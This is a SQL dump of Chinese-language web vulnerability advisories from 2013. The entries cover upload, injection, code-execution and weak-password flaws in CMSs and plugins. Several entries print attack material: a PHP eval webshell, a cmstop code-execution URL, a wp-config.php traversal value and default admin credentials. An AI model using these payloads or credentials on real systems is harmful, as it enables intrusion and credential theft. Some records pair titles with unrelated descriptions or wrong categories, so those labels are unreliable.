INSERT INTO `websoc_spider` VALUES ('634', '1118', 'web应用', 'WordPress ThinkResponsive插件 1.0 /wp-content/themes/ThinkResponsive/includes/uploadify/upload_settings_image.php 文件上传漏洞', ' 高危', '文件上传 ', 'WordPress ThinkResponsive插件 1.0', '/wp-content/themes/ThinkResponsive/includes/uploadify/upload_settings_image.php\r\n 该文件允许用户提交一个上传文件的请求，且后缀未经过任何过滤，攻击者可以在本地构造一个表单，然后以POST方式发送到此页面，将会在/wordpress/wp-content/uploads/settingsimages/    目录下生成上传的文件。导致可任意上传PHP脚本后门文件漏洞。', ' ', ' ', ' ', '2013-11-29');
INSERT INTO `websoc_spider` VALUES ('635', '1116', 'web应用', 'jdcms 1.3 /App/Lib/Action/Home/UcAction.class.php 文件上传漏洞', ' 高危', '文件上传 ', 'jdcms 1.3', 'jdcms 1.3 /App/Lib/Action/Home/UcAction.class.php 文件没有对上传图片进行任何限制，导致直接定义文件名及内容到相应目录。', ' ', ' ', ' ', '2013-11-29');
INSERT INTO `websoc_spider` VALUES ('636', '1108', 'web应用', 'PHPRSSReader 2010 SQL注入漏洞', ' 高危', 'Sql注入 ', 'phprssreader 2010', '在正常URL中http://www.site.com/[phprssreader]/news/ 中，news作为一个模块请求给服务器，而news则是会带入数据库进行查询，但是在获取的时候未经过任何过滤，可以加个单引号尝试，发现爆出SQL错误。', ' ', ' ', ' ', '2013-11-19');
INSERT INTO `websoc_spider` VALUES ('637', '1119', 'web应用', 'Awstatstotals 1.14 Awstatstotals.php 代码执行漏洞', ' 高危', '代码执行 ', 'Awstatstotals 1.14', 'Telartis\'s AWStats Totals是一款基于PHP的脚本程序。\r\nTelartis\'s AWStats Totals不正确处理URL参数，远程攻击者可以利用漏洞以应用程序权限执行任意代码。\r\n问题是脚本对提交给\'sort\'参数的数据缺少过滤，提交特殊的字符可插入PHP表达式，以WEB权限执行。', ' ', ' ', ' ', '2013-11-29');
INSERT INTO `websoc_spider` VALUES ('638', '1117', 'web应用', 'Anymacro /reg.php SQL注入漏洞', ' 高危', 'Sql注入 ', 'Anymacro /reg.php SQL注入漏洞', '在 /reg.php 中，F_domain参数存在SQL注入漏洞。', ' ', ' ', ' ', '2013-11-29');
INSERT INTO `websoc_spider` VALUES ('639', '1117', 'web应用', 'Anymacro /reg.php SQL注入漏洞', ' 高危', 'Sql注入 ', 'Anymacro Mail System G6', 'share.php未进行授权检查，可以任意访问，同时其中的F_email参数未进行有效过滤\r\n导致SQL注入，可以获取所有邮箱的帐号以及密码。', ' ', ' ', ' ', '2013-11-29');
INSERT INTO `websoc_spider` VALUES ('640', '1121', 'web应用', 'VbmCMS 6.0 /include/ip.inc.php 后门漏洞', ' 高危', 'Sql注入 ', 'VbmCMS 6.0', 'VbmCMS 6.0 /include/ip.inc.php 后门漏洞此PHP页面内容为：<?php eval($_POST[vbmcms])?>即为一个php一句话后门程序，攻击者可直接远程执行任意php代码。直接获取网站管理权限。', ' ', ' ', ' ', '2013-12-02');
INSERT INTO `websoc_spider` VALUES ('641', '1083', 'web应用', 'cmstop 代码执行漏洞', ' 高危', '代码执行 ', 'cmstop', 'cmstop 某接口存在漏洞，可以执行php代码，直接写入后门。利用代码如：/?app=search&controller=index&id=$page&action=search&wd=的&fuck=${@phpinfo()}。', ' ', ' ', ' ', '2013-10-16');
INSERT INTO `websoc_spider` VALUES ('642', '1086', 'web应用', 'WordPress miniaudioplayer插件 /wp-content/plugins/wp-miniaudioplayer/map_download.php 任意文件下载漏洞', ' 高危', '任意文件下载', 'WordPress miniaudioplayer插件', 'WordPress miniaudioplayer插件 /wp-content/plugins/wp-miniaudioplayer/map_download.php 文件中$file_url参数是从GET方式获取的，外部可控，但是没有经过任何字符串的限制和过滤就直接readfile了，导致我们可以将$file_url的参数赋成./../../../wp-config.php/. 就可以下载网站根目录下的wp-config.php文件了，里面存有mysql数据库的用户名和密码和一些加密数据，导致了信息泄露。', ' ', ' ', ' ', '2013-10-22');
INSERT INTO `websoc_spider` VALUES ('643', '1083', 'web应用', 'cmstop 代码执行漏洞', ' 高危', '代码执行 ', 'cmstop', 'cmstop /apps/vote/controller/vote.php 此文件中存在contentid参数，没有检测数字的合法性，导致了SQL注入漏洞。', ' ', ' ', ' ', '2013-10-16');
INSERT INTO `websoc_spider` VALUES ('644', '1084', 'web应用', 'E-tiller /reader/key_query.aspx SQL注入漏洞', ' 高危', 'Sql注入 ', 'E-tiller', 'E-tiller 文件/reader/key_query.aspx key参数没有合适的过滤，导致SQL注入漏洞。', ' ', ' ', ' ', '2013-10-16');
INSERT INTO `websoc_spider` VALUES ('645', '1105', 'web应用', 'laoy8 2.5 /Editor/asp/config.asp 代码执行漏洞', ' 高危', '代码执行 ', 'laoy8 2.5', 'laoy8 2.5 文件/Editor/asp/config.asp 代码执行漏洞 文件允许以GET方式接受了一个参数my，my带入程序的字符串能够直接执行asp代码。导致了代码执行漏洞。', ' ', ' ', ' ', '2013-11-15');
INSERT INTO `websoc_spider` VALUES ('646', '1091', 'web应用', 'ezOFFICE 弱密码漏洞', ' 中危', '弱密码', 'ezOFFICE 弱密码漏洞', '万户ezOFFICE是一套OA系统，部署该系统需配置多种相关组件，官方的配置指南为：\r\nhttp://wenku.baidu.com/view/af331cf69e31433239689347.html\r\n在配置指南中，给出了不同组件配置时的密码，而很多用户直接使用配置指南中的密码作为自己的OA系统中各个组建的密码，其中包括weblogic 、ftp服务、oracle的数据库，造成了极大的安全风险。', ' ', ' ', ' ', '2013-10-29');
INSERT INTO `websoc_spider` VALUES ('647', '1112', 'web应用', 'GV32 5.2.3 /system/class/class_url.php 代码执行漏洞', ' 高危', '代码执行 ', 'Gv32 5.2.3', 'GV32 5.2.3 /system/class/class_url.php 文件中可以看到存在一个eval函数，而执行的变量是$actval,而$actval原本意思是调用一个$needact函数的，$needact便是从URL中GET方式获取的了，所以导致了代码执行漏洞。', ' ', ' ', ' ', '2013-11-19');
INSERT INTO `websoc_spider` VALUES ('648', '1085', 'web应用', 'Zabbix httpmon.php SQL注入漏洞', ' 高危', 'Sql注入 ', 'Zabbix', 'Zabbix SIA Zabbix是拉脱维亚Zabbix SIA公司的一套开源的监控系统。该系统可监视各种网络参数，并提供通知机制让系统管理员快速定位、解决存在的各种问题。\r\nZABBIX API和Frontend中存在SQL注入漏洞。攻击者可利用该漏洞控制应用程序，访问或修改数据，或利用底层数据库中潜在的漏洞。以下版本受到影响：ZABBIX 2.0.9之前的版本，ZABBIX 1.8.18之前的版本。', 'CVE-2013-5743', 'CNNVD-201310-249', 'CNVD-2013-13627', '2013-10-22');
INSERT INTO `websoc_spider` VALUES ('649', '1079', 'web应用', 'FlashChat 6.0.8 /chat/upload.php 任意文件上传漏洞', ' 高危', '文件上传 ', 'FlashChat 6.0.8', 'FlashChat是一套可定制的聊天室软件。该软件可与大部分PHP/MySQL格式的CMS系统集成，也可作为独立的聊天室。\r\nFlashChat中存在任意文件上传漏洞，该漏洞源于程序没有充分过滤用户提交的输入。攻击者可利用该漏洞上传任意文件到受影响计算机，导致在受影响应用程序上下文中执行任意代码。FlashChat 6.0.2，6.0.4，6.0.5，6.0.6，6.0.7，6.0.8版本中存在漏洞。', ' ', 'CNNVD-201310-211', ' ', '2013-10-11');
INSERT INTO `websoc_spider` VALUES ('650', '1112', 'web应用', 'GV32 5.2.3 /system/class/class_url.php 代码执行漏洞', ' 高危', '代码执行 ', 'gv32 5.2.3', 'gv32 5.2.3 /application/www/art.php文件中可以看$id = trim($_REQUEST[\"id\"]);变量id从URL中get的方式获取，没有经过任何函数的过滤。而在接下来的代码中，$sqlquery引用了ID参数。然后直接带入selectOne函数当中，而selectOne函数是封装的一些SQL操作，没有对变量进行严格的验证和过滤，导致了SQL注入漏洞的产生。由于$id变量是数字型的，攻击者可以直接不用闭合单引号进行注入，危害甚大。', ' ', ' ', ' ', '2013-11-19');
INSERT INTO `websoc_spider` VALUES ('651', '1091', 'web应用', 'ezOFFICE 弱密码漏洞', ' 中危', '弱密码', 'EzOffice', 'defaultroot/work_flow/printWord.jsp?tabletable 变量未进行正确过滤,导致SQL注入漏洞', ' ', ' ', ' ', '2013-10-29');
INSERT INTO `websoc_spider` VALUES ('652', '1090', 'web应用', 'eWebwamEditorbo 弱密码漏洞', ' 中危', '弱密码', 'eWebwamEditorbo', 'eWebwamEditorbo存在默认用户名和密码adwanminbo/editorwaneboweb，如果安装时没有更改密码，则可以通过默认帐号进入eWebeditor后台。', ' ', ' ', ' ', '2013-10-25');
INSERT INTO `websoc_spider` VALUES ('653', '1120', 'web应用', 'DesktopCentral 8.0.0 AgentLogUploadServlet 文件上传漏洞', ' 高危', '文件上传 ', 'DesktopCentral 8.0.0', 'ZOHO ManageEngine Desktop Central（DC）是美国卓豪（ZOHO）公司的一套桌面管理解决方案。该方案包含软件分发、补丁管理、系统配置、远程控制等功能模块，可对桌面机以及服务器管理的整个生命周期提供支持。\r\nManageEngine DesktopCentral 8.0.0 build 80286及之前的版本中存在任意文件上传漏洞，该漏洞源于程序没有充分过滤用户提交的输入。攻击者可利用该漏洞上传任意文件到受影响计算机，导致在应用程序上下文中执行任意代码。', ' ', 'CNNVD-201311-277', ' ', '2013-11-29');
